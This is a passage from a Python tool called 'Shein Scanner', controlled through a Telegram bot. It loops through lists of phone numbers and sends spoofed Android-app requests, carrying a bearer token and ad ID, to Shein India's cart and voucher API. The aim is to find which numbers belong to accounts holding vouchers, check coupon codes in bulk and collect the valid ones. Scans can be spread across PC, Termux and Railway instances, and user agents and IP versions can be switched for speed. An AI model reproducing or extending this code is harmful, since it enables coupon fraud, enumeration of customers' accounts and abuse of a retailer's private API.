                                json={"chat_id": TELEGRAM_CHAT_ID, "text": f"⛔ <b>Stopping {PLATFORM} scanner...</b>", "parse_mode": "HTML"},
                                timeout=10
                            )
                            os._exit(0)
                    elif text == "/stopt":
                        if PLATFORM == "Termux":
                            requests.post(
                                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                                json={"chat_id": TELEGRAM_CHAT_ID, "text": "⛔ <b>Stopping Termux scanner...</b>", "parse_mode": "HTML"},
                                timeout=10
                            )
                            os._exit(0)
                    elif text == "/delse":
                        # Usage: /delse field value          → edits this machine
                        #        /delse PC field value       → edits only PC
                        #        /delse Termux field value   → edits only Termux
                        FIELD_MAP = {
                            "total_scanned":          "total_scanned",
                            "scanned":                "total_scanned",
                            "total_valid_vouchers":   "total_valid_vouchers",
                            "valid":                  "total_valid_vouchers",
                            "total_hits":             "total_hits",
                            "hits":                   "total_hits",
                            "total_vouchers_checked": "total_vouchers_checked",
                            "tested":                 "total_vouchers_checked",
                            "users_with_vouchers":    "users_with_vouchers",
                            "users":                  "users_with_vouchers",
                            "no_token_count":         "no_token_count",
                            "no_token":               "no_token_count",
                            "no_account_count":       "no_account_count",
                            "no_account":             "no_account_count",
                            "invalid_vouchers_count": "invalid_vouchers_count",
                            "invalid":                "invalid_vouchers_count",
                        }
                        parts = raw_text.strip().split()
                        # Check if second word is a platform name → targeted command
                        _known_platforms = {"pc", "pc2", "termux", "windows"}
                        if len(parts) >= 2 and parts[1].lower() in _known_platforms:
                            # /delse PLATFORM field value
                            _target_platform = parts[1].lower()
                            if _target_platform != PLATFORM.lower():
                                seen_ids.add(uid)  # mark handled so we don't re-process
                                continue  # not our command
                            parts = [parts[0]] + parts[2:]  # strip platform from parts
                        if len(parts) != 3:
                            s = _local_stats_manager.stats if _local_stats_manager else {}
                            msg = (
                                f"⚙️ <b>Current Stats — {PLATFORM}</b>\n\n"
                                f"<code>/delse scanned  {s.get('total_scanned', 0)}</code>\n"
                                f"<code>/delse valid    {s.get('total_valid_vouchers', 0)}</code>\n"
                                f"<code>/delse hits     {s.get('total_hits', 0)}</code>\n"
                                f"<code>/delse tested   {s.get('total_vouchers_checked', 0)}</code>\n"
                                f"<code>/delse users    {s.get('users_with_vouchers', 0)}</code>\n"
                                f"<code>/delse no_token {s.get('no_token_count', 0)}</code>\n"
                                f"<code>/delse no_account {s.get('no_account_count', 0)}</code>\n"
                                f"<code>/delse invalid  {s.get('invalid_vouchers_count', 0)}</code>"
                            )
                            requests.post(
                                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                                json={"chat_id": TELEGRAM_CHAT_ID, "text": msg, "parse_mode": "HTML"},
                                timeout=10
                            )
                        else:
                            _, field, value = parts
                            field = field.lower()
                            real_field = FIELD_MAP.get(field)
                            if not real_field:
                                requests.post(
                                    f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                                    json={"chat_id": TELEGRAM_CHAT_ID, "text": f"❌ Unknown field: <code>{field}</code>", "parse_mode": "HTML"},
                                    timeout=10
                                )
                            elif _local_stats_manager is None:
                                requests.post(
                                    f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                                    json={"chat_id": TELEGRAM_CHAT_ID, "text": "⚠️ Scanner not ready yet.", "parse_mode": "HTML"},
                                    timeout=10
                                )
                            else:
                                try:
                                    old_val = _local_stats_manager.stats.get(real_field, 0)
                                    new_val = int(value)
                                    _local_stats_manager.stats[real_field] = new_val
                                    _local_stats_manager.push_to_remote()
                                    requests.post(
                                        f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                                        json={"chat_id": TELEGRAM_CHAT_ID,
                                              "text": f"✅ <b>[{PLATFORM}]</b> <code>{field}</code>: <b>{old_val}</b> → <b>{new_val}</b>",
                                              "parse_mode": "HTML"},
                                        timeout=10
                                    )
                                except ValueError:
                                    requests.post(
                                        f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                                        json={"chat_id": TELEGRAM_CHAT_ID, "text": f"❌ Value must be a number.", "parse_mode": "HTML"},
                                        timeout=10
                                    )
                    elif text == "/dels":
                        # /dels → reset this machine only
                        # /dels all → reset all machines (each resets itself)
                        # /dels PC / /dels Termux → target specific machine
                        parts_dels = raw_text.strip().split()
                        target_dels = parts_dels[1].strip().lower() if len(parts_dels) > 1 else None
                        should_reset = (
                            target_dels is None or
                            target_dels == "all" or
                            target_dels == PLATFORM.lower()
                        )
                        if should_reset and _local_stats_manager is not None:
                            _local_stats_manager.reset_stats()
                            try:
                                registry = _read_registry()
                                if PLATFORM in registry:
                                    registry[PLATFORM] = {"ts": int(time.time())}
                                    _write_registry(registry)
                            except Exception:
                                pass
                            requests.post(
                                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                                json={"chat_id": TELEGRAM_CHAT_ID, "text": f"🗑️ <b>[{PLATFORM}] Stats reset to zero.</b>", "parse_mode": "HTML"},
                                timeout=10
                            )
                    elif text == "/ping":
                        def _send_ping(update_uid):
                            _register_ping()  # push our fresh timestamp first
                            if not _should_i_reply(update_uid):
                                return
                            registry = _get_ping_status()
                            now = int(time.time())
                            alive_threshold = 30
                            lines_out = []
                            total_scanned_all = 0
                            total_valid_all = 0
                            for name in sorted(registry.keys()):
                                entry = registry[name]
                                if not isinstance(entry, dict):
                                    ts = entry
                                    status = "🟢 Running" if (now - ts) <= alive_threshold else "🔴 Offline"
                                    lines_out.append(f"{name} - {status}")
                                    continue
                                ts = entry.get("ts", 0)
                                status = "🟢 Running" if (now - ts) <= alive_threshold else "🔴 Offline"
                                scanned = entry.get("scanned", 0)
                                valid   = entry.get("valid", 0)
                                total_scanned_all += scanned
                                total_valid_all   += valid
                                lines_out.append(f"{name} - {status}  |  {scanned:,} scanned  •  {valid} valid")
                            if total_scanned_all > 0:
                                lines_out.append(f"\n📊 <b>Combined Total Scanned: {total_scanned_all:,}</b>")
                                lines_out.append(f"✅ <b>Combined Valid: {total_valid_all}</b>")
                            ping_msg = "\n".join(lines_out) if lines_out else "No instances found."
                            requests.post(
                                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                                json={"chat_id": TELEGRAM_CHAT_ID, "text": ping_msg, "parse_mode": "HTML"},
                                timeout=10
                            )
                        threading.Thread(target=_send_ping, args=(uid,), daemon=True).start()
                    elif text == "/help":
                        # Use atomic claim to ensure exactly ONE machine sends /help
                        _help_registry = _get_ping_status()
                        _help_alive = sorted(set(
                            [n for n, e in _help_registry.items()
                             if isinstance(e, dict) and (int(time.time()) - e.get("ts", 0)) <= 30]
                        ) | {PLATFORM})
                        if _should_i_reply(uid):
                            coupon_cmds = "\n".join(
                                f"  <code>{cmd}</code>  — send ₹{cmd.replace('/lalala', '')} coupon file"
                                for cmd in sorted(COMMAND_MAP.keys())
                            )
                            help_text = (
                                "📖 <b>Available Commands</b>\n"
                                "━━━━━━━━━━━━━━━━━━━━━━\n\n"

                                "📡 <b>Status</b>\n"
                                "  <code>/ping</code>  — show all instances status + combined stats\n"
                                "  <code>/help</code>  — show this message\n\n"

                                "🔍 <b>Coupon Checker</b>\n"
                                "  <code>/check CODE1 CODE2 ...</code>  — validate one or more coupon codes\n"
                                "  <code>/check</code> (multiline) — put each code on its own line\n"
                                "  📎 Or send a <b>.txt file</b> (one code per line) to check in bulk\n\n"

                                "💰 <b>Coupon File Download</b>\n"
                                f"{coupon_cmds}\n"
                                "  <code>/lalala</code>  — send ALL coupon files at once\n\n"

                                "📊 <b>Stats Management</b>\n"
                                "  <code>/delse &lt;field&gt; &lt;value&gt;</code>  — edit a stat field on this machine\n"
                                "  <code>/delse &lt;PC|Termux&gt; &lt;field&gt; &lt;value&gt;</code>  — target a specific machine\n"
                                "  <code>/delse</code> (no args)  — show current stats with edit commands\n"
                                "  Fields: <code>scanned</code>, <code>valid</code>, <code>hits</code>, <code>tested</code>,\n"
                                "           <code>users</code>, <code>no_token</code>, <code>no_account</code>, <code>invalid</code>\n\n"
                                "  <code>/dels</code>  — reset stats on this machine\n"
                                "  <code>/dels all</code>  — reset stats on ALL machines\n"
                                "  <code>/dels &lt;PC|Termux&gt;</code>  — reset stats on a specific machine\n\n"

                                "⏹️ <b>Stop Scanner</b>\n"
                                "  <code>/stopw</code>  — stop the PC / Windows scanner\n"
                                "  <code>/stopt</code>  — stop the Termux scanner\n\n"

                                "📤 <b>File Upload</b>\n"
                                "  Send a <b>.txt file</b> of phone numbers to start a new scan\n"
                                "  Add a caption to route to a machine:\n"
                                "    <code>/scan PC</code>  or  <code>/scan Termux</code>\n\n"

                                "━━━━━━━━━━━━━━━━━━━━━━\n"
                                f"🤖 Running on: <b>{', '.join(_help_alive) if _help_alive else PLATFORM}</b>"
                            )
                            requests.post(
                                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                                json={"chat_id": TELEGRAM_CHAT_ID, "text": help_text, "parse_mode": "HTML"},
                                timeout=10
                            )

                    elif text == "/check":
                        # Extract codes first (both platforms need this)
                        codes = []
                        first_line_parts = lines[0].strip().split()[1:]  # after /check
                        codes.extend([p.strip().upper() for p in first_line_parts if p.strip()])
                        for line in lines[1:]:
                            code = line.strip().upper()
                            if code:
                                codes.append(code)

                        if not codes:
                            if PLATFORM == "Windows":
                                requests.post(
                                    f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                                    json={"chat_id": TELEGRAM_CHAT_ID, "text": "⚠️ No codes provided.\n\nUsage:\n/check CODE1 CODE2\nor\n/check\nCODE1\nCODE2\n\nOr just send a <b>.txt file</b> with one code per line!", "parse_mode": "HTML"},
                                    timeout=10
                                )
                        else:
                            dispatch_check(codes, uid)

                    # ── .txt file upload → auto-detect phone numbers OR coupon codes ──
                    elif msg.get("document"):
                        doc = msg["document"]
                        fname = doc.get("file_name", "")
                        caption = (msg.get("caption") or "").strip()
                        caption_cmd = caption.lower().split()[0] if caption else ""

                        if fname.lower().endswith(".txt"):
                            def _handle_doc_upload(file_id, file_name, upload_uid, cap_cmd):
                                raw_lines = download_txt_lines(file_id)
                                if not raw_lines:
                                    return

                                # Instant detection — samples only first 50 lines, no full scan
                                if _looks_like_phone_numbers(raw_lines):
                                    # ── Phone numbers file ──
                                    _pending_scan[upload_uid] = {
                                        "numbers": raw_lines,  # preserve original casing
                                        "filename": file_name
                                    }

                                    # Build alive instance list for buttons
                                    registry = _get_ping_status()
                                    now_ts = int(time.time())
                                    alive = sorted([
                                        n for n, e in registry.items()
                                        if isinstance(e, dict) and (now_ts - e.get("ts", 0)) <= 30
                                    ])
                                    if not alive:
                                        alive = [PLATFORM]

                                    keyboard = {
                                        "inline_keyboard": [
                                            [{"text": inst, "callback_data": f"scan:{upload_uid}:{inst}"}
                                             for inst in sorted(alive)]
                                        ]
                                    }
                                    try:
                                        requests.post(
                                            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                                            json={
                                                "chat_id": TELEGRAM_CHAT_ID,
                                                "text": (
                                                    f"📱 <b>Phone numbers file detected</b>\n"
                                                    f"📄 <code>{file_name}</code>  •  {len(raw_lines)} numbers\n\n"
                                                    f"Select instance to run:"
                                                ),
                                                "parse_mode": "HTML",
                                                "reply_markup": keyboard
                                            },
                                            timeout=10
                                        )
                                    except Exception:
                                        pass
                                else:
                                    # ── Coupon codes file — uppercase only here, not for phones ──
                                    codes = [l.upper() for l in raw_lines]
                                    try:
                                        requests.post(
                                            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                                            json={
                                                "chat_id": TELEGRAM_CHAT_ID,
                                                "text": (
                                                    f"📄 <b>File:</b> <code>{file_name}</code>\n"
                                                    f"🔢 <b>Codes:</b> {len(codes)}"
                                                ),
                                                "parse_mode": "HTML"
                                            },
                                            timeout=10
                                        )
                                    except Exception:
                                        pass
                                    dispatch_check(codes, upload_uid)

                            threading.Thread(
                                target=_handle_doc_upload,
                                args=(doc["file_id"], fname, uid, caption_cmd),
                                daemon=True
                            ).start()
                        else:
                            # Non-txt file — just run caption command if present
                            if caption_cmd in COMMAND_MAP:
                                handle(caption_cmd)
                            elif caption_cmd == "/lalala":
                                handle_all()

                    # ── Inline keyboard callback (instance selection for scan) ──
                    # Note: callback_query updates are handled at the top of the loop
                else:
                    seen_ids.add(uid)
        except Exception:
            pass
        # Heartbeat: update ping registry every ~15s
        now_t = time.time()
        if now_t - _last_ping_time[0] >= 15:
            _register_ping()
            _last_ping_time[0] = now_t
        time.sleep(1)




def main():
    print(f"{Fore.CYAN}{'='*60}")
    print(f"{Fore.CYAN}Shein Scanner - Coupon Validation Mode")
    print(f"{Fore.CYAN}{'='*60}")

    # Start Railway health check server (no-op on local)
    if IS_RAILWAY:
        start_health_server()
        print(f"{Fore.CYAN}🚂 Running on Railway")

    # ── Create notifier early so we can use Telegram for input on Railway ──
    notifier = TelegramNotifier(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID)

    if IS_RAILWAY:
        notifier.send_message(
            f"🚂 <b>Railway instance starting...</b>\n"
            f"Platform: {PLATFORM}\n"
            f"I'll ask you a few questions before scanning begins."
        )

    CART_ID_FILE = "cartid.txt"
    # Load saved cart ID if exists, otherwise use hardcoded default
    if os.path.exists(CART_ID_FILE):
        with open(CART_ID_FILE, "r") as f:
            saved = f.read().strip()
        default_cart_id = saved if saved else "96331ee6-ecc4-43f8-92fc-dbacf63d241b"
    else:
        default_cart_id = "96331ee6-ecc4-43f8-92fc-dbacf63d241b"

    def _validate_cart(cid):
        try:
            test_url = f"https://api.services.sheinindia.in/rilfnlwebservices/v2/rilfnl/users/anonymous/carts/{cid}/vouchers"
            test_r = requests.post(
                f"{test_url}?client_type=Android%2F32&client_version=1.0.14",
                headers={
                    "User-Agent": "okhttp/4.9.0",
                    "Accept": "application/json",
                    "Client_type": "Android/32",
                    "Client_version": "1.0.14",
                    "X-Tenant-Id": "SHEIN",
                    "Ad_id": AD_ID,
                    "Connection": "keep-alive",
                    "Authorization": f"Bearer {SHEIN_BEARER_TOKEN}",
                    "Content-Type": "application/x-www-form-urlencoded",
                },
                data="voucherId=INVALIDTEST123&employeeOfferRestriction=true",
                timeout=8
            )
            return "Cart not found" not in test_r.text
        except Exception:
            return False

    # ── Cart ID ────────────────────────────────────────────────────────────────
    print(f"{Fore.CYAN}🔍 Validating default Cart ID...")
    if _validate_cart(default_cart_id):
        cart_id = default_cart_id
        print(f"{Fore.GREEN}✅ Default Cart ID is valid!")
        if IS_RAILWAY:
            notifier.send_message(f"✅ Default Cart ID is valid — using it.\n<code>{cart_id[:16]}...</code>")
    else:
        print(f"{Fore.RED}❌ Default Cart ID invalid.")
        if IS_RAILWAY:
            while True:
                cart_id = railway_input(
                    f"❌ Default Cart ID is invalid.\nPlease send your Cart ID:",
                    notifier,
                    default=default_cart_id
                )
                if not cart_id:
                    notifier.send_message("⚠️ Cart ID cannot be empty. Please send it again.")
                    continue
                print(f"{Fore.CYAN}🔍 Validating Cart ID: {cart_id[:16]}...")
                if _validate_cart(cart_id):
                    notifier.send_message(f"✅ Cart ID valid! Saving as new default.")
                    with open(CART_ID_FILE, "w") as f:
                        f.write(cart_id)
                    break
                else:
                    notifier.send_message(f"❌ Cart ID not found. Try again.")
        else:
            while True:
                cart_id = input(f"{Fore.YELLOW}Cart ID: ").strip()
                if not cart_id:
                    print(f"{Fore.RED}Cart ID cannot be empty.")
                    continue
                print(f"{Fore.CYAN}🔍 Validating Cart ID: {cart_id[:16]}...")
                if _validate_cart(cart_id):
                    print(f"{Fore.GREEN}✅ Cart ID is valid!")
                    with open(CART_ID_FILE, "w") as f:
                        f.write(cart_id)
                    print(f"{Fore.GREEN}💾 Cart ID saved as new default.")
                    break
                else:
                    print(f"{Fore.RED}❌ Cart ID not found! Try again.")

    print(f"{Fore.GREEN}Using Cart ID: {cart_id}")

    # ── IP version ────────────────────────────────────────────────────────────
    import socket as _socket
    _orig_getaddrinfo = _socket.getaddrinfo

    def _detect_default_ip():
        try:
            res = _socket.getaddrinfo("api.services.sheinindia.in", 443)
            for item in res:
                if item[0] == _socket.AF_INET6:
                    return "IPv6"
            return "IPv4"
        except Exception:
            return "IPv4"

    _default_ip_label = _detect_default_ip()

    ip_choice = railway_input(
        f"Select IP version:\n  1 = IPv4\n  2 = IPv6\n  default = System default ({_default_ip_label})",
        notifier,
        default=""
    )

    if ip_choice == "1":
        _socket.getaddrinfo = lambda h, p, family=0, type=0, proto=0, flags=0: _orig_getaddrinfo(h, p, _socket.AF_INET, type, proto, flags)
        print(f"{Fore.GREEN}✅ Using IPv4")
    elif ip_choice == "2":
        _socket.getaddrinfo = lambda h, p, family=0, type=0, proto=0, flags=0: _orig_getaddrinfo(h, p, _socket.AF_INET6, type, proto, flags)
        print(f"{Fore.GREEN}✅ Using IPv6")
    else:
        print(f"{Fore.GREEN}✅ Using system default ({_default_ip_label})")

    # ── Fastest UA ────────────────────────────────────────────────────────────
    ua_answer = railway_input(
        "Use fastest UA? (benchmarks all UAs for speed)\n  Enter/default = Yes\n  n = No (use default UA)",
        notifier,
        default=""
    )
    use_fastest = ua_answer.lower() != 'n'

    stats_manager = StatsManager()
    current_stats = stats_manager.get_stats()

    global _local_stats_manager
    _local_stats_manager = stats_manager

    print(f"\n{Fore.CYAN}Previous Stats:")
    print(f"{Fore.CYAN}Total Valid Vouchers Found: {current_stats['total_valid_vouchers']}")
    print(f"{Fore.CYAN}Total Vouchers Checked: {current_stats['total_vouchers_checked']}")
    print(f"{Fore.CYAN}Users with Vouchers: {current_stats['users_with_vouchers']}")
    print(f"{Fore.CYAN}Invalid Vouchers: {current_stats['invalid_vouchers_count']}")
    print()


    try:
        with open("nums.txt", "r") as f:
            all_numbers = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{Fore.RED}nums.txt not found")
        return

    last_index = get_last_progress()
    part_info = f" • {PLATFORM}"

    if last_index > 0 and last_index < len(all_numbers):
        numbers = all_numbers[last_index:]
        print(f"{Fore.YELLOW}Resuming from number {last_index + 1}/{len(all_numbers)}")
        notifier.send_message(f"🔄 <b>Resumed{part_info}</b>  |  From {last_index + 1}/{len(all_numbers)} | Cart: {cart_id[:8]}...")
    else:
        numbers = all_numbers
        last_index = 0
        print(f"{Fore.YELLOW}Starting fresh scan")
        notifier.send_message(f"▶️ <b>Started{part_info}</b>  |  {len(all_numbers)} numbers | Cart: {cart_id[:8]}...")

    print(f"{Fore.YELLOW}Loaded {len(all_numbers)} numbers, scanning {len(numbers)} remaining\n")

    scanner = SheinScanner(notifier, stats_manager, cart_id, use_benchmarked_ua=use_fastest)

    global _active_scanner
    _active_scanner = scanner

    # Attach notifier and stats_manager to scanner for standby access
    scanner.notifier = notifier
    scanner.stats_manager = stats_manager

    # Start coupon collector bot in background
    threading.Thread(target=start_collector_bot, daemon=True).start()
    print(f"{Fore.CYAN}🤖 Collector bot started — listening for /lalala commands\n")

    start = time.time()
    current_global_index = last_index

    try:
        for i, number in enumerate(numbers, 1):
            current_global_index = last_index + i
            scanner.process_number(number, current_global_index, len(all_numbers))
            save_progress(current_global_index)
            time.sleep(0.096)

    except KeyboardInterrupt:
        elapsed = time.time() - start

        print(f"\n\n{Fore.YELLOW}Stopped at number {current_global_index}/{len(all_numbers)}")
        final_stats = stats_manager.get_stats()
        stats_manager.push_to_remote()
        notifier.send_message(
            f"⏹️ <b>Stopped{part_info}</b>\n\n"
            f"📍 <b>Progress:</b> {current_global_index}/{len(all_numbers)}\n"
            f"📊 <b>Total Scanned:</b> {final_stats['total_scanned']}\n"
            f"✅ <b>Valid Vouchers:</b> {final_stats['total_valid_vouchers']}\n"
            f"🎟️ <b>Total Vouchers Tested:</b> {final_stats['total_vouchers_checked']}\n"
            f"👥 <b>Users with Vouchers:</b> {final_stats['users_with_vouchers']}\n"
            f"❌ <b>Redeemed Vouchers:</b> {final_stats['invalid_vouchers_count']}\n"
        )
        print(f"{Fore.CYAN}Stats saved to {STATS_FILE}")
        print(f"{Fore.CYAN}Valid Vouchers Found: {final_stats['total_valid_vouchers']}")
        sys.exit(0)

    print()
    elapsed = time.time() - start
    final_stats = stats_manager.get_stats()

    part_line2 = f"💻 {PLATFORM}  |  "
    ua_info = f"⚡ <b>Using Fastest UA:</b> {scanner.current_ua[:50]}...\n" if use_fastest else ""
    speed = len(all_numbers) / elapsed if elapsed > 0 else 0

    # Push final stats to JSONBin, then read combined totals across all instances
    stats_manager.push_to_remote()
    combined, all_platform_data = _jsonbin.get_combined_totals()
    combined_line = ""
    if len(all_platform_data) > 1:
        per_line = "\n".join(
            f"  {p}: {d.get('total_scanned', 0):,} scanned  •  {d.get('total_valid_vouchers', 0)} valid"
            for p, d in sorted(all_platform_data.items())
            if isinstance(d, dict)
        )
        combined_line = (
            f"\n━━━━━━━━━━━━━━━━━━\n"
            f"🌐 <b>All Instances Combined</b>\n"
            f"{per_line}\n"
            f"📊 <b>Total: {combined['total_scanned']:,} scanned  •  {combined['total_valid_vouchers']} valid</b>"
        )

    notifier.send_message(
        f"✅ <b>Complete!  |  {part_line2}{len(all_numbers)} numbers</b>\n\n"
        f"{ua_info}"
        f"🛒 <b>Cart ID:</b> {cart_id[:16]}...\n"
        f"📊 <b>Total Scanned:</b> {final_stats['total_scanned']:,}\n"
        f"✅ <b>Valid Vouchers Found:</b> {final_stats['total_valid_vouchers']}\n"
        f"🎟️ <b>Total Vouchers Tested:</b> {final_stats['total_vouchers_checked']}\n"
        f"👥 <b>Users with Vouchers:</b> {final_stats['users_with_vouchers']}\n"
        f"❌ <b>Redeemed Vouchers:</b> {final_stats['invalid_vouchers_count']}\n"
        f"📵 <b>No Token:</b> {final_stats['no_token_count']}\n"
        f"👤 <b>No Account:</b> {final_stats['no_account_count']}\n"
        f"⏱️ <b>Time:</b> {elapsed:.0f}s\n"
        f"⚡ <b>Speed:</b> {speed:.1f} numbers/sec"
        f"{combined_line}"
    )

    if os.path.exists(PROGRESS_FILE):
        os.remove(PROGRESS_FILE)

    print(f"\n{Fore.GREEN}{'='*60}")
    print(f"{Fore.GREEN}COMPLETE!")
    print(f"{Fore.GREEN}Cart ID used: {cart_id}")
    if use_fastest:
        print(f"{Fore.GREEN}Fastest UA used: {scanner.current_ua[:50]}...")
    print(f"{Fore.GREEN}Total Scanned: {final_stats['total_scanned']}")
    print(f"{Fore.GREEN}Valid Vouchers Found: {final_stats['total_valid_vouchers']}")
    print(f"{Fore.GREEN}Total Vouchers Tested: {final_stats['total_vouchers_checked']}")
    print(f"{Fore.GREEN}Users with Vouchers: {final_stats['users_with_vouchers']}")
    print(f"{Fore.GREEN}Redeemed Vouchers: {final_stats['invalid_vouchers_count']}")
    print(f"{Fore.GREEN}No Token: {final_stats['no_token_count']}")
    print(f"{Fore.GREEN}No Account: {final_stats['no_account_count']}")
    print(f"{Fore.GREEN}Time: {elapsed:.0f}s")
    print(f"{Fore.GREEN}Valid coupons saved to: {VALID_COUPONS_FILE}")
    print(f"{Fore.GREEN}Stats saved to: {STATS_FILE}")
    print(f"{Fore.GREEN}{'='*60}")

    # ── Standby mode: keep bot alive, wait for new file upload ──
    global _standby_mode
    _standby_mode = True
    notifier.send_message(
        f"💤 <b>[{PLATFORM}] Standby mode</b>\n"
        f"Upload a phone numbers .txt file to start a new scan."
    )
    print(f"\n{Fore.CYAN}💤 Standby mode — bot is still running.")
    print(f"{Fore.CYAN}Upload a numbers .txt file via Telegram to start a new scan.")
    print(f"{Fore.CYAN}Press Ctrl+C to exit.\n")

    try:
        while True:
            time.sleep(5)
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Exiting standby mode.")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Stopped")
